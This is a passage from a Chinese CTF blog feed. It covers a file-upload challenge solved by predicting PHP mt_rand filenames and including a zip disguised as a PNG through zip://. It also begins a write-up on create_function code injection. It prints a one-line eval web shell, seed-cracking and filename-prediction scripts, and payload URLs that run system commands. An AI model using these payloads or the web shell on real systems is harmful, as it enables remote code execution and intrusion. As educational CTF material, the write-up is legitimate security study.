class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($page) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="keyword">include</span>($page.<span class="string">'.php'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php 没太多用处，核心在 upload.php。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</span><br><span class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line"><span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line"><span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line"><span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line"><span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">$ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">$str .= $set[$ch];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);  <span class="comment">// 生成随机数做种子</span></span><br><span class="line">mt_srand($seed);  <span class="comment">// 用seed给随机数发生器播种</span></span><br><span class="line">$ss = mt_rand();  <span class="comment">// 取随机数</span></span><br><span class="line"></span><br><span class="line">        $hash = md5(session_id() . $ss);  <span class="comment">// session_id() 是可控的，设为 0 或者很短的值</span></span><br><span class="line">        <span class="comment">// 服务端对 session_id() 的态度：你有用你的，你没有我给你设。</span></span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);<span class="comment">// 此处是设置 SESSION </span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">$check3 = !preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line"><span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\$filename = ‘./uP1O4Ds/‘ . random_str() . ‘_’ . ​$_FILES[‘file-upload-field’][‘name’];</p></blockquote><p>由此可知，重点是预测 <code>random_str()</code> 的值。</p><p>联想到此前的 2018 SWPUCTF 用优惠码买个X？<a href="https://www.anquanke.com/post/id/168308" target="_blank" rel="noopener">SWPUCTF wp</a></p><p>因此我们只要得到 <code>mt_srand()</code> 函数的播种种子的值，就可以预测出24位的优惠码。</p><blockquote><p>测试发现无论是 rand() 函数还是 mt_rand() 函数，当随机数种子相同的时候，无论运行多少次，产生的随机数序列都是一样的。所以，如果我们在代码中自己播种的随机数种子泄露，就会导致产生的随机数序列被别人猜到，造成安全问题。</p></blockquote><p>对于这个题也类似，只要得到种子，就能预测。</p><p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a> </p><p><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">大牛的爆破种子神器</a></p><p>直接强行爆破太麻烦了，先爆出一个随机数，利用这个随机数去爆破它的种子。</p><p>将 test.php 文件打个压缩包 test.zip，然后改后缀名 test.png，利用 <code>zip://</code> 解压缩读取</p><p><a href="http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()</a>;</p><p>种子确定了，随机值也确定了，直接利用源代码中的方式就能推出路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$std = <span class="string">"6f51b1f6ba8ee543732b21dbe0efacb9"</span>;  <span class="comment">// cookie 中的 SESSION</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">999999999</span>;$i++) &#123;</span><br><span class="line">        $ha = md5(<span class="string">"0"</span> . $i);</span><br><span class="line">        <span class="keyword">if</span>($ha === $std) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Success-----------=&gt;"</span> . $i;</span><br><span class="line">            <span class="comment">// 爆出随机数为 i</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($i % <span class="number">100000000</span> == <span class="number">0</span>) <span class="keyword">echo</span> $i . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得出随机数</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e0bea95.png" alt="屏幕捕获_2018_12_30_19_58_38_361.png"></p><p>然后利用神器，爆出种子</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e1033b1.png" alt="屏幕捕获_2018_12_30_20_10_40_322.png"></p><p>利用这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爆出来的种子</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">76047661</span>,<span class="number">1136899518</span>,<span class="number">1497431590</span>,<span class="number">2832522619</span>);  </span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">    mt_srand($a);</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">                 <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">                 <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">                 <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">                 <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    $ss = mt_rand();  <span class="comment">// 这一步必须加上，否则与服务器端的随机值对应不上</span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">32</span>; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// echo 'zip://uP1O4Ds/' . $str . '_test.png%23test&amp;a=phpinfo();' . "&lt;br&gt;";</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'http://111.198.29.45:30117/uP1O4Ds/'</span> . $str . <span class="string">'_test.png'</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先检查地址是否有效，然后利用之前传的后门进行命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后的 payload 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> test.png%23test&amp;a=<span class="built_in">echo</span>%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span></span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure><p>然后 cat flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;粗一看，是文件上传的题目。&lt;/p&gt;
&lt;p&gt;随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。&lt;/p&gt;
&lt;p&gt;问题是文件传到哪里去了，这也是本题的核心考点。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://111.198.29.45:30117/?page=uploa
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="php 伪随机数" scheme="https://wywwzjj.top/tags/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>Code Breaking Writeup</title>
    <link href="https://wywwzjj.top/2018/12/30/Code-Breaking-Writeup/"/>
    <id>https://wywwzjj.top/2018/12/30/Code-Breaking-Writeup/</id>
    <published>2018-12-30T04:34:38.000Z</published>
    <updated>2019-05-16T03:23:23.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1.easy - function"></a>1.easy - function</h2><blockquote><p>PHP 函数利用技巧</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>环境：</p><ul><li>Apache 2.4.25</li><li>PHP 7.2.12</li></ul><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p><strong>仔细看一下 <code>isD</code> 模式修饰符</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">i</span>  ==&gt;  忽略大小写</span><br><span class="line"><span class="attr">s</span>  ==&gt;  点号匹配所有字符，包含换行符，未设置则不匹配换行符</span><br><span class="line"><span class="attr">D</span>  ==&gt;  模式中的 $ 仅仅匹配目标字符串的末尾（不匹配结尾的换行符）</span><br></pre></td></tr></table></figure><blockquote><p><strong>create_function( string \$args , string $code )</strong></p></blockquote><p>常规用法 <a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function() 代码注入</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可控点为第一个参数</span></span><br><span class="line">create_function($_GET[<span class="string">'code'</span>], <span class="string">''</span>);</span><br><span class="line">--&gt;</span><br><span class="line">create_function(<span class="string">')&#123;phpinfo();&#123;//'</span>, <span class="string">''</span>) </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 可控点为第二个参数</span></span><br><span class="line">create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</span><br><span class="line">--&gt; </span><br><span class="line">create_function(<span class="string">''</span>, <span class="string">'&#125;phpinfo();//'</span>)</span><br></pre></td></tr></table></figure><p>为什么可以直接拼接生效呢？我们先看看 <a href="https://github.com/php/php-src/blob/PHP-7.2.1/Zend/zend_builtin_functions.c" target="_blank" rel="noopener">源码 1858行</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LAMBDA_TEMP_FUNCNAME<span class="meta-string">"__lambda_func"</span></span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span></span><br><span class="line"><span class="comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span></span><br><span class="line">ZEND_FUNCTION(create_function) &#123;</span><br><span class="line">    zend_string *function_name;</span><br><span class="line"><span class="keyword">char</span> *eval_code, *function_args, *function_code;</span><br><span class="line"><span class="keyword">size_t</span> eval_code_length, function_args_len, function_code_len;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">char</span> *eval_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"ss"</span>, &amp;function_args, </span><br><span class="line">       &amp;function_args_len, &amp;function_code, &amp;function_code_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">eval_code = (<span class="keyword">char</span> *) emalloc(<span class="keyword">sizeof</span>(<span class="string">"function "</span> LAMBDA_TEMP_FUNCNAME)</span><br><span class="line">+function_args_len</span><br><span class="line">+<span class="number">2</span><span class="comment">/* for the args parentheses */</span></span><br><span class="line">+<span class="number">2</span><span class="comment">/* for the curly braces */</span></span><br><span class="line">+function_code_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// void * memcpy ( void * destination, const void * source, size_t num );</span></span><br><span class="line">eval_code_length = <span class="keyword">sizeof</span>(<span class="string">"function "</span> LAMBDA_TEMP_FUNCNAME <span class="string">"("</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(eval_code, <span class="string">"function "</span> LAMBDA_TEMP_FUNCNAME <span class="string">"("</span>, eval_code_length);</span><br><span class="line"><span class="comment">// 将 function_args 复制到 eval_code</span></span><br><span class="line"><span class="built_in">memcpy</span>(eval_code + eval_code_length, function_args, function_args_len);</span><br><span class="line">eval_code_length += function_args_len;</span><br><span class="line"></span><br><span class="line">eval_code[eval_code_length++] = <span class="string">')'</span>;</span><br><span class="line">eval_code[eval_code_length++] = <span class="string">'&#123;'</span>;</span><br><span class="line"><span class="comment">// 到此，形成了 function " __lambda_func "(function_args) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(eval_code + eval_code_length, function_code, function_code_len);</span><br><span class="line">eval_code_length += function_code_len;</span><br><span class="line"></span><br><span class="line">eval_code[eval_code_length++] = <span class="string">'&#125;'</span>;</span><br><span class="line">eval_code[eval_code_length] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function " __lambda_func "(function_args) &#123; eval_code &#125;\0</span></span><br><span class="line">eval_name = zend_make_compiled_string_description(<span class="string">"runtime-created function"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重点在这里，总的来说，可以理解为 形成匿名函数后直接扔给了 eval()</span></span><br><span class="line"><span class="comment">// eval('function __lambda_func(' . $_GET['args']) . ')&#123;' . $_GET['code'] . '&#125;\0');</span></span><br><span class="line">    retval = zend_eval_stringl(eval_code, eval_code_length, <span class="literal">NULL</span>, eval_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下有删减</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟一下 <code>zend_eval_stringl()</code> <a href="https://github.com/php/php-src/blob/PHP-7.2.1/Zend/zend_execute_API.c" target="_blank" rel="noopener">1047行</a> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ZEND_API <span class="keyword">int</span> <span class="title">zend_eval_stringl</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> str_len, zval *retval_ptr, <span class="keyword">char</span> *string_name)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zval pv;</span><br><span class="line">zend_op_array *new_op_array;</span><br><span class="line"><span class="keyword">uint32_t</span> original_compiler_options;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">ZVAL_NEW_STR(&amp;pv, zend_string_alloc(str_len + <span class="keyword">sizeof</span>(<span class="string">"return ;"</span>)<span class="number">-1</span>, <span class="number">1</span>));</span><br><span class="line"><span class="built_in">memcpy</span>(Z_STRVAL(pv), <span class="string">"return "</span>, <span class="keyword">sizeof</span>(<span class="string">"return "</span>) - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(Z_STRVAL(pv) + <span class="keyword">sizeof</span>(<span class="string">"return "</span>) - <span class="number">1</span>, str, str_len);</span><br><span class="line">Z_STRVAL(pv)[Z_STRLEN(pv) - <span class="number">1</span>] = <span class="string">';'</span>;</span><br><span class="line">Z_STRVAL(pv)[Z_STRLEN(pv)] = <span class="string">'\0'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 把 pv 设置为 string 类型，值为 str</span></span><br><span class="line">ZVAL_STRINGL(&amp;pv, str, str_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf("Evaluating '%s'\n", pv.value.str.val);*/</span></span><br><span class="line"></span><br><span class="line">original_compiler_options = CG(compiler_options);</span><br><span class="line">CG(compiler_options) = ZEND_COMPILE_DEFAULT_FOR_EVAL;</span><br><span class="line">    <span class="comment">// 把 php 代码编译成 opcode</span></span><br><span class="line">new_op_array = zend_compile_string(&amp;pv, string_name);</span><br><span class="line">CG(compiler_options) = original_compiler_options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (new_op_array) &#123;</span><br><span class="line">zval 